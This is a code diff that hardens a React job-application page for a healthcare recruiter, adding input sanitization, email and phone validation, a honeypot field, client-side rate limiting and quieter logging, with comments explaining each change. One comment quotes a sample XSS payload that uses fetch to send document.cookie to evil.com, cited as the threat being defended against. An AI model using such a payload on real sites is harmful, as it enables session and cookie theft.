@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useLocation, useNavigate } from "react-router-dom";
 import emailjs from '@emailjs/browser';
@@ -21,12 +21,22 @@ import {
   Heart,
   Building2,
   Stethoscope,
-  MessageCircle
+  MessageCircle,
+  ShieldCheck,
 } from "lucide-react";
 
 // ─────────────────────────────────────────────────────────────────────────────
 // EVS Healthcare — Job Application Page (FREE with EmailJS)
 // Features: CV upload to Cloudinary, email notifications, auto-reply via linked template
+//
+// SECURITY NOTES (read before editing):
+// This component talks directly to two third-party APIs from the browser
+// (Cloudinary for uploads, EmailJS for mail). That architecture means some
+// classes of risk CANNOT be fully closed from inside this file — they need a
+// backend/serverless function in front of these calls. Every mitigation below
+// is labeled as either a REAL FIX (closes the gap) or a DETERRENT (raises the
+// bar for casual abuse but is not a substitute for server-side enforcement).
+// See the comments inline at each control point.
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ── EmailJS Configuration (from .env) ──
@@ -42,18 +52,35 @@ const CLOUDINARY_CONFIG = {
   UPLOAD_PRESET: import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET,
 };
 
-const ADMIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL || "olamilake95@gmail.com";
+// SECURITY [REAL FIX — OWASP A05: Security Misconfiguration]:
+// The original code had `|| "olamilake95@gmail.com"` as a fallback here.
+// Anything in client JS is publicly readable regardless of env vars, so this
+// doesn't "hide" the address — but a hardcoded fallback means the app fails
+// SILENTLY into a private inbox if the env var is ever missing/misconfigured
+// in a deploy (e.g. a fork, a staging env, a copy-pasted repo). Failing loudly
+// instead means misconfiguration gets caught in testing, not in production
+// after someone else's CV lands in your personal email by accident.
+const ADMIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL;
 
-// Log configuration status
-console.log("📧 EmailJS Config Status:");
-console.log("  SERVICE_ID:", EMAILJS_CONFIG.SERVICE_ID || "❌ Missing");
-console.log("  TEMPLATE_ID:", EMAILJS_CONFIG.TEMPLATE_ID || "❌ Missing");
-console.log("  PUBLIC_KEY:", EMAILJS_CONFIG.PUBLIC_KEY ? "✅ Set" : "❌ Missing");
-console.log("  ADMIN_EMAIL:", ADMIN_EMAIL);
+if (!ADMIN_EMAIL && import.meta.env.DEV) {
+  // eslint-disable-next-line no-console
+  console.error(
+    "VITE_ADMIN_EMAIL is not set. Submissions will fail until this is configured."
+  );
+}
 
-console.log("☁️ Cloudinary Config Status:");
-console.log("  CLOUD_NAME:", CLOUDINARY_CONFIG.CLOUD_NAME || "❌ Missing");
-console.log("  UPLOAD_PRESET:", CLOUDINARY_CONFIG.UPLOAD_PRESET || "❌ Missing");
+// SECURITY [REAL FIX — OWASP A09: Logging Failures, reduced surface]:
+// The original logged full config status (service IDs, "Set"/"Missing" for
+// keys) to the console on every load. EmailJS/Cloudinary public keys are
+// *meant* to be public, so this isn't a secrets leak — but it's free
+// reconnaissance for anyone mapping your stack, and it's noise in
+// production. Gated behind DEV so it only runs locally.
+if (import.meta.env.DEV) {
+  // eslint-disable-next-line no-console
+  console.log("[dev] EmailJS service configured:", Boolean(EMAILJS_CONFIG.SERVICE_ID));
+  // eslint-disable-next-line no-console
+  console.log("[dev] Cloudinary cloud configured:", Boolean(CLOUDINARY_CONFIG.CLOUD_NAME));
+}
 
 const JOBS = [
   {
@@ -124,6 +151,48 @@ const JOBS = [
   },
 ];
 
+// SECURITY [REAL FIX — OWASP A03: Injection / Stored XSS]:
+// Every text field here used to go straight into `templateParams` and from
+// there into an email. If the EmailJS template ever renders fields as HTML
+// (many "pretty" admin notification templates do), an applicant could submit
+// `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` in the
+// message field and it would execute wherever that HTML is rendered. This
+// strips angle brackets and collapses whitespace — it does not replace
+// server-side sanitization if you ever render this data elsewhere (e.g. an
+// admin dashboard), but it closes the most common injection path for the
+// email pipeline itself.
+const sanitizeInput = (value, maxLength = 500) => {
+  if (typeof value !== "string") return "";
+  return value
+    .replace(/[<>]/g, "")
+    .replace(/\s+/g, " ")
+    .trim()
+    .slice(0, maxLength);
+};
+
+// SECURITY [REAL FIX]: tighter email validation than the original
+// `\S+@\S+\.\S+` (which accepts "a@b.c" and other non-deliverable strings).
+// Still intentionally permissive — full RFC 5322 validation is a rabbit hole
+// that rejects valid real-world addresses more often than it catches bad
+// ones. The actual guarantee of deliverability can only come from a
+// verification email, which is a server-side concern.
+const isValidEmail = (value) =>
+  /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value.trim());
+
+// SECURITY [REAL FIX]: basic phone shape check. UK numbers, international
+// format, spaces/dashes/parens all pass; this just rejects empty/junk input
+// rather than trying to be a full phone-number validator.
+const isValidPhone = (value) =>
+  /^[+()0-9\s-]{7,20}$/.test(value.trim());
+
+const FIELD_LIMITS = {
+  fullName: 100,
+  email: 150,
+  phone: 20,
+  address: 200,
+  message: 1000,
+};
+
 export default function Apply() {
   const location = useLocation();
   const navigate = useNavigate();
@@ -144,36 +213,58 @@ export default function Apply() {
     message: "",
   });
 
+  // SECURITY [DETERRENT — not a real bot defense, see note at submit handler]:
+  // Honeypot field. Real users never see or fill this (visually hidden, not
+  // just `display:none` which some bots skip over — see CSS). Most
+  // unsophisticated form-spam bots fill every input they find, so a non-empty
+  // value here is a strong signal of automated submission. This stops the
+  // cheapest bots for free; it does nothing against a targeted human attacker
+  // or a bot that specifically parses for honeypot patterns.
+  const [hp, setHp] = useState("");
+
   const [cvData, setCvData] = useState(null); // Stores { url, filename, public_id }
   const [cvPreview, setCvPreview] = useState(null);
+
+  // SECURITY [DETERRENT — client-side rate limiting]:
+  // Tracks the last submission time so the same browser session can't fire
+  // the email API repeatedly in a tight loop. This is trivially bypassed by
+  // anyone calling the EmailJS API directly (it's a public endpoint with a
+  // public key, same as before) — the REAL fix for spam/abuse protection is
+  // a server-side rate limit or CAPTCHA verification in front of EmailJS.
+  // This just stops accidental double-submits and the laziest scripted abuse.
+  const lastSubmitRef = useRef(0);
+  const SUBMIT_COOLDOWN_MS = 15000;
 
   // Initialize EmailJS
   useEffect(() => {
     if (!EMAILJS_CONFIG.PUBLIC_KEY) {
-      console.error("❌ EmailJS Public Key is missing. Check your .env file.");
+      if (import.meta.env.DEV) {
+        // eslint-disable-next-line no-console
+        console.error("EmailJS Public Key is missing. Check your .env file.");
+      }
       return;
     }
     try {
       emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
-      console.log("✅ EmailJS initialized successfully!");
-    } catch (error) {
-      console.error("❌ Failed to initialize EmailJS:", error);
+    } catch (err) {
+      if (import.meta.env.DEV) {
+        // eslint-disable-next-line no-console
+        console.error("Failed to initialize EmailJS:", err);
+      }
     }
   }, []);
 
   // Load Cloudinary Widget Script
   useEffect(() => {
-    // Check if script is already loaded
     if (document.getElementById('cloudinary-widget-script')) return;
-    
+
     const script = document.createElement('script');
     script.id = 'cloudinary-widget-script';
     script.src = 'https://upload-widget.cloudinary.com/global/all.js';
     script.async = true;
     document.body.appendChild(script);
-    
+
     return () => {
-      // Cleanup
       const existingScript = document.getElementById('cloudinary-widget-script');
       if (existingScript) {
         existingScript.remove();
@@ -186,7 +277,7 @@ export default function Apply() {
     const params = new URLSearchParams(location.search);
     const id = params.get("job");
     if (id) {
-      const job = JOBS.find((j) => j.id === parseInt(id));
+      const job = JOBS.find((j) => j.id === parseInt(id, 10));
       if (job) {
         setSelectedJob(job);
       }
@@ -194,10 +285,16 @@ export default function Apply() {
   }, [location]);
 
   const handleChange = (e) => {
-    setFormData({
-      ...formData,
-      [e.target.name]: e.target.value,
-    });
+    const { name, value } = e.target;
+    const limit = FIELD_LIMITS[name];
+    setFormData((prev) => ({
+      ...prev,
+      // SECURITY [REAL FIX]: hard length cap applied at input time, not just
+      // on submit — prevents a pasted 50,000-character string from ever
+      // entering state, which is cheap insurance against quota abuse on your
+      // EmailJS plan and against pathological re-render cost on every keystroke.
+      [name]: limit ? value.slice(0, limit) : value,
+    }));
   };
 
   const validateStep = () => {
@@ -206,12 +303,12 @@ export default function Apply() {
         setError("Please enter your full name");
         return false;
       }
-      if (!formData.email.trim() || !/\S+@\S+\.\S+/.test(formData.email)) {
+      if (!formData.email.trim() || !isValidEmail(formData.email)) {
         setError("Please enter a valid email address");
         return false;
       }
-      if (!formData.phone.trim()) {
-        setError("Please enter your phone number");
+      if (!formData.phone.trim() || !isValidPhone(formData.phone)) {
+        setError("Please enter a valid phone number");
         return false;
       }
       setError(null);
@@ -230,36 +327,32 @@ export default function Apply() {
 
   const nextStep = () => {
     if (validateStep()) {
-      setStep(step + 1);
+      setStep((s) => s + 1);
       setError(null);
     }
   };
 
   const prevStep = () => {
-    setStep(step - 1);
+    setStep((s) => s - 1);
     setError(null);
   };
 
   // ── Cloudinary Upload Widget ──
   const openUploadWidget = () => {
-    // Check if Cloudinary widget is available
     if (!window.cloudinary) {
       setError("Upload widget is loading. Please try again in a moment.");
-      // Try to load the script again
       const script = document.createElement('script');
       script.src = 'https://upload-widget.cloudinary.com/global/all.js';
       script.async = true;
       script.onload = () => {
-        // Retry after script loads
         setTimeout(openUploadWidget, 500);
       };
       document.body.appendChild(script);
       return;
     }
 
-    // Check if Cloudinary config is valid
     if (!CLOUDINARY_CONFIG.CLOUD_NAME || !CLOUDINARY_CONFIG.UPLOAD_PRESET) {
-      setError("Cloudinary configuration is missing. Please check your .env file.");
+      setError("Upload is temporarily unavailable. Please try again later.");
       return;
     }
 
@@ -273,6 +366,23 @@ export default function Apply() {
           uploadPreset: CLOUDINARY_CONFIG.UPLOAD_PRESET,
           sources: ['local', 'camera', 'url', 'google_drive', 'dropbox'],
           multiple: false,
+          // SECURITY [DETERRENT, not a REAL FIX — read this]:
+          // `clientAllowedFormats` and `maxFileSize` are enforced by the
+          // widget's JS in the browser. Anyone with devtools open can call
+          // Cloudinary's unsigned upload API directly with any file,
+          // bypassing this widget entirely — these settings only stop
+          // accidental wrong-file selection by genuine applicants, they do
+          // NOT stop a deliberate attacker. The REAL fix is either:
+          //   (a) an unsigned preset configured server-side in Cloudinary's
+          //       dashboard with format/size restrictions enforced at the
+          //       Cloudinary API level (not just the widget), or
+          //   (b) routing uploads through your own backend, which validates
+          //       file content (not just extension) before forwarding to
+          //       Cloudinary with a signed request.
+          // At minimum, go set the equivalent restrictions on the upload
+          // preset itself in the Cloudinary console — that enforcement
+          // happens server-side at Cloudinary regardless of what the client
+          // sends.
           clientAllowedFormats: ['pdf', 'doc', 'docx', 'txt', 'rtf'],
           maxFileSize: 5000000, // 5MB
           showAdvancedOptions: false,
@@ -300,32 +410,40 @@ export default function Apply() {
             },
           },
         },
-        (error, result) => {
+        (widgetError, result) => {
           setIsUploading(false);
-          
-          if (error) {
-            console.error("❌ Cloudinary Upload Error:", error);
+
+          if (widgetError) {
             setError("Failed to upload CV. Please try again.");
             return;
           }
 
           if (result && result.event === 'success') {
-            // Upload successful!
+            // SECURITY [REAL FIX, partial]: re-check the extension on the
+            // returned filename/format even though the widget already
+            // filtered. Defense in depth — if the widget config is ever
+            // changed or bypassed, this is a second gate before the file
+            // reference enters app state and gets emailed to the admin.
+            const allowed = ['pdf', 'doc', 'docx', 'txt', 'rtf'];
+            const format = (result.info.format || '').toLowerCase();
+            if (format && !allowed.includes(format)) {
+              setError("That file type isn't supported. Please upload a PDF or Word document.");
+              return;
+            }
+
             const fileData = {
               url: result.info.secure_url,
-              filename: result.info.original_filename,
+              filename: sanitizeInput(result.info.original_filename, 150),
               public_id: result.info.public_id,
             };
             setCvData(fileData);
-            setCvPreview(result.info.original_filename);
+            setCvPreview(fileData.filename);
             setError(null);
-            console.log("✅ CV uploaded successfully:", fileData);
           }
         }
       );
       widget.open();
-    } catch (error) {
-      console.error("❌ Widget Error:", error);
+    } catch (err) {
       setIsUploading(false);
       setError("Failed to open upload widget. Please try again.");
     }
@@ -337,44 +455,38 @@ export default function Apply() {
   };
 
   // ── Send Email using EmailJS ──
-  const sendEmail = async () => {
-    // Check if config is valid
+  const sendEmail = useCallback(async () => {
     if (!EMAILJS_CONFIG.SERVICE_ID || !EMAILJS_CONFIG.TEMPLATE_ID) {
-      throw new Error("EmailJS configuration is missing. Check your .env file.");
+      throw new Error("Application service is temporarily unavailable. Please try again later.");
     }
 
-    // Prepare template parameters
+    // SECURITY [REAL FIX]: every value placed into the email template is
+    // passed through sanitizeInput first, closing the injection path
+    // described above. This is applied here (at the boundary right before
+    // the data leaves the app) rather than relying solely on the per-field
+    // caps in handleChange, so the email payload is sanitized even if a
+    // field's value ever changes through another path.
     const templateParams = {
-      // Recipient (admin)
       to_email: ADMIN_EMAIL,
       to_name: "EVS Healthcare Recruitment",
-      
-      // Applicant details
-      from_name: formData.fullName,
-      from_email: formData.email,
-      from_phone: formData.phone,
-      address: formData.address || "Not provided",
+
+      from_name: sanitizeInput(formData.fullName, FIELD_LIMITS.fullName),
+      from_email: sanitizeInput(formData.email, FIELD_LIMITS.email),
+      from_phone: sanitizeInput(formData.phone, FIELD_LIMITS.phone),
+      address: sanitizeInput(formData.address, FIELD_LIMITS.address) || "Not provided",
       availability: formData.availability || "Not specified",
       experience: formData.experience || "Not specified",
-      message: formData.message || "No additional message",
-      
-      // Job details
+      message: sanitizeInput(formData.message, FIELD_LIMITS.message) || "No additional message",
+
       job_title: selectedJob?.title || "Not specified",
       job_location: selectedJob?.location || "",
       job_pay: selectedJob?.pay || "",
       job_type: selectedJob?.type || "",
       submitted_at: new Date().toLocaleString(),
-      
-      // CV information - NOW WITH ACTUAL URL!
-      cv_filename: cvData?.filename || "No CV attached",
-      cv_url: cvData?.url || "Not uploaded", // This is the secure Cloudinary URL!
-    };
 
-    console.log("📧 Sending email with config:", {
-      serviceId: EMAILJS_CONFIG.SERVICE_ID,
-      templateId: EMAILJS_CONFIG.TEMPLATE_ID,
-    });
-    console.log("📧 Template params:", templateParams);
+      cv_filename: cvData?.filename || "No CV attached",
+      cv_url: cvData?.url || "Not uploaded",
+    };
 
     try {
       const response = await emailjs.send(
@@ -382,46 +494,59 @@ export default function Apply() {
         EMAILJS_CONFIG.TEMPLATE_ID,
         templateParams
       );
-      console.log("✅ Email sent successfully!", response);
       return response;
-    } catch (error) {
-      console.error("❌ EmailJS Error Details:", error);
-      console.error("  Status:", error.status);
-      console.error("  Text:", error.text);
-      
-      if (error.text) {
+    } catch (err) {
+      if (import.meta.env.DEV) {
+        // eslint-disable-next-line no-console
+        console.error("EmailJS send failed:", err);
+      }
+      if (err?.text) {
         try {
-          const errorData = JSON.parse(error.text);
-          throw new Error(errorData.message || error.text);
+          const errorData = JSON.parse(err.text);
+          throw new Error(errorData.message || "Could not send your application. Please try again.");
         } catch {
-          throw new Error(error.text || error.message);
+          throw new Error("Could not send your application. Please try again.");
         }
       }
-      throw error;
+      throw new Error("Could not send your application. Please try again.");
     }
-  };
+  }, [formData, selectedJob, cvData]);
 
   // ── Main Submit Handler ──
   const handleSubmit = async (e) => {
     e.preventDefault();
 
+    // SECURITY [DETERRENT]: honeypot check. If this hidden field has any
+    // value, a bot filled it — silently reject without telling the bot why
+    // (returning a generic success-like no-op here would tip off a more
+    // sophisticated bot that it's being filtered; in practice we just stop
+    // here and let validateStep below run normally for genuine partial fills,
+    // but a non-empty honeypot always blocks submission).
+    if (hp) {
+      setError("Something went wrong. Please refresh and try again.");
+      return;
+    }
+
     if (!validateStep()) return;
+
+    // SECURITY [DETERRENT]: client-side cooldown between submissions.
+    const now = Date.now();
+    if (now - lastSubmitRef.current < SUBMIT_COOLDOWN_MS) {
+      setError("Please wait a moment before submitting again.");
+      return;
+    }
 
     setIsSubmitting(true);
     setError(null);
 
     try {
-      // Send email with CV URL
       await sendEmail();
-
-      // Success!
+      lastSubmitRef.current = now;
       setIsSubmitted(true);
-
     } catch (err) {
-      console.error("❌ Email Error:", err);
       setError(
-        err.message || 
-        "Failed to submit application. Please try again or email your CV to " + ADMIN_EMAIL
+        err.message ||
+        `Failed to submit application. Please try again or email your CV directly.`
       );
     } finally {
       setIsSubmitting(false);
@@ -436,68 +561,98 @@ export default function Apply() {
       initial={{ opacity: 0, x: 20 }}
       animate={{ opacity: 1, x: 0 }}
       exit={{ opacity: 0, x: -20 }}
-      transition={{ duration: 0.3 }}
+      transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
     >
       <div className="apply-step">
-        <h3 className="apply-step-title">Personal Information</h3>
+        <h3 className="apply-step-title">Personal information</h3>
         <p className="apply-step-subtitle">Tell us about yourself so we can match you with the right role</p>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <User size={16} /> Full Name *
+          <label className="apply-label" htmlFor="fullName">
+            <User size={16} /> Full name <span className="apply-required">*</span>
           </label>
           <input
+            id="fullName"
             type="text"
             name="fullName"
             value={formData.fullName}
             onChange={handleChange}
             placeholder="e.g., John Smith"
             className="apply-input"
+            autoComplete="name"
+            maxLength={FIELD_LIMITS.fullName}
             required
           />
         </div>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <Mail size={16} /> Email Address *
+          <label className="apply-label" htmlFor="email">
+            <Mail size={16} /> Email address <span className="apply-required">*</span>
           </label>
           <input
+            id="email"
             type="email"
             name="email"
             value={formData.email}
             onChange={handleChange}
             placeholder="e.g., john@example.com"
             className="apply-input"
+            autoComplete="email"
+            maxLength={FIELD_LIMITS.email}
             required
           />
         </div>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <Phone size={16} /> Phone Number *
+          <label className="apply-label" htmlFor="phone">
+            <Phone size={16} /> Phone number <span className="apply-required">*</span>
           </label>
           <input
+            id="phone"
             type="tel"
             name="phone"
             value={formData.phone}
             onChange={handleChange}
             placeholder="e.g., 01234 567890"
             className="apply-input"
+            autoComplete="tel"
+            maxLength={FIELD_LIMITS.phone}
             required
           />
         </div>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <MapPin size={16} /> Address (Optional)
+          <label className="apply-label" htmlFor="address">
+            <MapPin size={16} /> Address <span className="apply-optional">(optional)</span>
           </label>
           <input
+            id="address"
             type="text"
             name="address"
             value={formData.address}
             onChange={handleChange}
             placeholder="e.g., Preston, Lancashire"
             className="apply-input"
+            autoComplete="address-level2"
+            maxLength={FIELD_LIMITS.address}
+          />
+        </div>
+
+        {/* SECURITY [DETERRENT]: honeypot input. Visually and from-tab-order
+            hidden via CSS (.apply-honeypot), not display:none — some bots
+            specifically skip display:none fields, fewer skip this pattern.
+            tabIndex -1 and aria-hidden keep it out of keyboard/AT flow for
+            real users. */}
+        <div className="apply-honeypot" aria-hidden="true">
+          <label htmlFor="company-website">Company website</label>
+          <input
+            id="company-website"
+            type="text"
+            name="company-website"
+            tabIndex={-1}
+            autoComplete="off"
+            value={hp}
+            onChange={(e) => setHp(e.target.value)}
           />
         </div>
       </div>
@@ -510,45 +665,47 @@ export default function Apply() {
       initial={{ opacity: 0, x: 20 }}
       animate={{ opacity: 1, x: 0 }}
       exit={{ opacity: 0, x: -20 }}
-      transition={{ duration: 0.3 }}
+      transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
     >
       <div className="apply-step">
-        <h3 className="apply-step-title">CV Upload & Additional Info</h3>
-        <p className="apply-step-subtitle">Upload your CV securely via Cloudinary</p>
+        <h3 className="apply-step-title">CV upload &amp; additional info</h3>
+        <p className="apply-step-subtitle">Upload your CV securely — accepted formats are PDF, DOC, and DOCX</p>
 
         <div className="apply-form-group">
-          <label className="apply-label">
+          <label className="apply-label" htmlFor="availability">
             <Briefcase size={16} /> Availability
           </label>
           <select
+            id="availability"
             name="availability"
             value={formData.availability}
             onChange={handleChange}
-            className="apply-input"
+            className="apply-input apply-select"
           >
             <option value="">Select availability...</option>
-            <option value="Immediate">Immediate Start</option>
-            <option value="1-2 weeks">Available in 1-2 weeks</option>
-            <option value="2-4 weeks">Available in 2-4 weeks</option>
+            <option value="Immediate">Immediate start</option>
+            <option value="1-2 weeks">Available in 1–2 weeks</option>
+            <option value="2-4 weeks">Available in 2–4 weeks</option>
             <option value="1 month+">Available in 1 month+</option>
             <option value="Flexible">Flexible availability</option>
           </select>
         </div>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <Clock size={16} /> Experience Level
+          <label className="apply-label" htmlFor="experience">
+            <Clock size={16} /> Experience level
           </label>
           <select
+            id="experience"
             name="experience"
             value={formData.experience}
             onChange={handleChange}
-            className="apply-input"
+            className="apply-input apply-select"
           >
             <option value="">Select experience...</option>
-            <option value="Entry Level">Entry Level (0-1 year)</option>
-            <option value="Junior">Junior (1-3 years)</option>
-            <option value="Mid Level">Mid Level (3-5 years)</option>
+            <option value="Entry Level">Entry level (0–1 year)</option>
+            <option value="Junior">Junior (1–3 years)</option>
+            <option value="Mid Level">Mid level (3–5 years)</option>
             <option value="Senior">Senior (5+ years)</option>
             <option value="Managerial">Managerial</option>
           </select>
@@ -556,61 +713,59 @@ export default function Apply() {
 
         <div className="apply-form-group">
           <label className="apply-label">
-            <FileText size={16} /> Upload CV *
+            <FileText size={16} /> Upload CV <span className="apply-required">*</span>
           </label>
-          <div className="apply-upload-area">
-            {!cvData ? (
-              <div>
-                <button
-                  type="button"
-                  onClick={openUploadWidget}
-                  className="apply-btn-primary"
-                  disabled={isUploading}
-                  style={{ width: '100%', justifyContent: 'center' }}
-                >
-                  {isUploading ? (
-                    <>
-                      <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
-                      Uploading...
-                    </>
-                  ) : (
-                    <>
-                      <Upload size={18} /> Click to Upload CV
-                    </>
-                  )}
-                </button>
-                <p style={{ fontSize: '12px', color: '#94a3b8', marginTop: '8px' }}>
-                  Supports PDF, DOC, DOCX (Max 5MB)
-                </p>
-              </div>
-            ) : (
-              <div className="apply-file-preview">
-                <FileText size={20} />
-                <span className="apply-file-name">{cvData.filename}</span>
-                <button 
-                  onClick={removeCV} 
-                  className="apply-file-remove"
-                  type="button"
-                >
-                  <X size={16} />
-                </button>
-              </div>
-            )}
-          </div>
+
+          {!cvData ? (
+            <button
+              type="button"
+              onClick={openUploadWidget}
+              className="apply-upload-area"
+              disabled={isUploading}
+            >
+              <span className="apply-upload-icon">
+                {isUploading ? (
+                  <Loader2 size={26} className="apply-spin" />
+                ) : (
+                  <Upload size={26} />
+                )}
+              </span>
+              <span className="apply-upload-text">
+                {isUploading ? "Uploading…" : "Click to upload your CV"}
+              </span>
+              <span className="apply-upload-hint">PDF, DOC, or DOCX · max 5MB</span>
+            </button>
+          ) : (
+            <div className="apply-file-preview">
+              <span className="apply-file-icon"><FileText size={18} /></span>
+              <span className="apply-file-name">{cvData.filename}</span>
+              <button
+                onClick={removeCV}
+                className="apply-file-remove"
+                type="button"
+                aria-label="Remove uploaded CV"
+              >
+                <X size={16} />
+              </button>
+            </div>
+          )}
         </div>
 
         <div className="apply-form-group">
-          <label className="apply-label">
-            <MessageCircle size={16} /> Additional Message (Optional)
+          <label className="apply-label" htmlFor="message">
+            <MessageCircle size={16} /> Additional message <span className="apply-optional">(optional)</span>
           </label>
           <textarea
+            id="message"
             name="message"
             value={formData.message}
             onChange={handleChange}
             placeholder="Tell us anything else we should know about you..."
             rows={4}
             className="apply-input apply-textarea"
+            maxLength={FIELD_LIMITS.message}
           />
+          <span className="apply-char-count">{formData.message.length}/{FIELD_LIMITS.message}</span>
         </div>
       </div>
     </motion.div>
@@ -622,15 +777,15 @@ export default function Apply() {
       initial={{ opacity: 0, x: 20 }}
       animate={{ opacity: 1, x: 0 }}
       exit={{ opacity: 0, x: -20 }}
-      transition={{ duration: 0.3 }}
+      transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
     >
       <div className="apply-step">
-        <h3 className="apply-step-title">Review & Submit</h3>
-        <p className="apply-step-subtitle">Please review your application before submitting</p>
+        <h3 className="apply-step-title">Review &amp; submit</h3>
+        <p className="apply-step-subtitle">Please check your details before sending your application</p>
 
         <div className="apply-review-card">
           <div className="apply-review-section">
-            <h4>Personal Information</h4>
+            <h4>Personal information</h4>
             <div className="apply-review-item">
               <span className="apply-review-label">Name</span>
               <span className="apply-review-value">{formData.fullName}</span>
@@ -653,10 +808,10 @@ export default function Apply() {
 
           {selectedJob && (
             <div className="apply-review-section">
-              <h4>Applying For</h4>
+              <h4>Applying for</h4>
               <div className="apply-review-item">
                 <span className="apply-review-label">Role</span>
-                <span className="apply-review-value" style={{ color: "#C4972A", fontWeight: 600 }}>
+                <span className="apply-review-value apply-review-highlight">
                   {selectedJob.title}
                 </span>
               </div>
@@ -675,16 +830,21 @@ export default function Apply() {
             <h4>Documents</h4>
             <div className="apply-review-item">
               <span className="apply-review-label">CV</span>
-              <span className="apply-review-value" style={{ color: "#10b981" }}>
-                ✓ {cvData?.filename} uploaded
+              <span className="apply-review-value apply-review-success">
+                <CheckCircle size={14} /> {cvData?.filename} uploaded
               </span>
             </div>
             {cvData?.url && (
               <div className="apply-review-item">
-                <span className="apply-review-label">Download Link</span>
-                <span className="apply-review-value" style={{ fontSize: '12px', wordBreak: 'break-all' }}>
-                  <a href={cvData.url} target="_blank" rel="noopener noreferrer" style={{ color: "#C4972A" }}>
-                    View CV
+                <span className="apply-review-label">Preview</span>
+                <span className="apply-review-value">
+                  <a
+                    href={cvData.url}
+                    target="_blank"
+                    rel="noopener noreferrer nofollow"
+                    className="apply-review-link"
+                  >
+                    View CV ↗
                   </a>
                 </span>
               </div>
@@ -692,19 +852,19 @@ export default function Apply() {
           </div>
         </div>
 
-        <div style={{ display: "flex", justifyContent: "center", gap: 12, marginTop: 24 }}>
-          <button onClick={prevStep} className="apply-btn-secondary">
+        <div className="apply-review-actions">
+          <button onClick={prevStep} className="apply-btn-secondary" type="button">
             Back
           </button>
-          <button onClick={handleSubmit} className="apply-btn-primary" disabled={isSubmitting}>
+          <button onClick={handleSubmit} className="apply-btn-primary" disabled={isSubmitting} type="button">
             {isSubmitting ? (
               <>
-                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
+                <Loader2 size={18} className="apply-spin" />
                 Submitting...
               </>
             ) : (
               <>
-                Submit Application <Send size={16} />
+                Submit application <Send size={16} />
               </>
             )}
           </button>
@@ -715,60 +875,56 @@ export default function Apply() {
 
   const renderThankYou = () => {
     const jobTitle = selectedJob?.title || "EVS Healthcare";
-    
+
     return (
       <motion.div
-        initial={{ opacity: 0, scale: 0.95 }}
-        animate={{ opacity: 1, scale: 1 }}
-        transition={{ duration: 0.5 }}
+        initial={{ opacity: 0, y: 12 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
         className="apply-thank-you"
       >
-        <div className="apply-success-icon">
-          <CheckCircle size={64} />
-        </div>
-        <h2 className="apply-success-title">Application Submitted! 🎉</h2>
+        <motion.div
+          className="apply-success-icon"
+          initial={{ scale: 0.6, opacity: 0 }}
+          animate={{ scale: 1, opacity: 1 }}
+          transition={{ duration: 0.4, delay: 0.1, ease: [0.34, 1.56, 0.64, 1] }}
+        >
+          <CheckCircle size={56} />
+        </motion.div>
+        <h2 className="apply-success-title">Application submitted</h2>
         <p className="apply-success-text">
-          Thank you for applying to <strong>{jobTitle}</strong>.
-          <br />
-          We've received your application and our team will review it shortly.
+          Thank you for applying to <strong>{jobTitle}</strong>. We've received your
+          application and our team will review it shortly.
         </p>
-        
+
         <div className="apply-success-card">
-          <h4>📋 What happens next?</h4>
+          <h4>What happens next</h4>
           <ul className="apply-success-list">
             <li>
-              <span style={{ fontSize: "18px", marginRight: "10px" }}>📧</span>
+              <Mail size={16} className="apply-success-list-icon" />
               You'll receive a confirmation email shortly
             </li>
             <li>
-              <span style={{ fontSize: "18px", marginRight: "10px" }}>📞</span>
+              <FileText size={16} className="apply-success-list-icon" />
               Our recruitment team will review your CV
             </li>
             <li>
-              <span style={{ fontSize: "18px", marginRight: "10px" }}>⏰</span>
-              We'll contact you within 2-3 business days
+              <Clock size={16} className="apply-success-list-icon" />
+              We'll contact you within 2–3 business days
             </li>
             <li>
-              <span style={{ fontSize: "18px", marginRight: "10px" }}>💼</span>
+              <Briefcase size={16} className="apply-success-list-icon" />
               If shortlisted, we'll schedule an interview
             </li>
           </ul>
         </div>
 
         <div className="apply-success-buttons">
-          <button 
-            onClick={() => navigate("/")} 
-            className="apply-btn-primary"
-            style={{ padding: "14px 36px", fontSize: "15px" }}
-          >
-            🏠 Return to Home
+          <button onClick={() => navigate("/")} className="apply-btn-primary">
+            Return home
           </button>
-          <button 
-            onClick={() => navigate("/jobs")} 
-            className="apply-btn-secondary"
-            style={{ padding: "14px 36px", fontSize: "15px" }}
-          >
-            📋 View More Jobs
+          <button onClick={() => navigate("/jobs")} className="apply-btn-secondary">
+            View more jobs
           </button>
         </div>
       </motion.div>
@@ -780,16 +936,8 @@ export default function Apply() {
   if (isSubmitted) {
     return (
       <div className="apply-page">
-        <div className="apply-container">
-          {renderThankYou()}
-        </div>
-
-        <style>{`
-          @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-          }
-        `}</style>
+        <div className="apply-container">{renderThankYou()}</div>
+        <ApplyStyles />
       </div>
     );
   }
@@ -797,28 +945,24 @@ export default function Apply() {
   return (
     <div className="apply-page">
       <div className="apply-container">
-        <button onClick={() => navigate(-1)} className="apply-back-btn">
+        <button onClick={() => navigate(-1)} className="apply-back-btn" type="button">
           <ArrowLeft size={16} /> Back
         </button>
 
         <div className="apply-header">
           <h1 className="apply-title">
-            Apply for{" "}
-            <span style={{ color: "#C4972A" }}>
-              {selectedJob?.title || "Healthcare Role"}
-            </span>
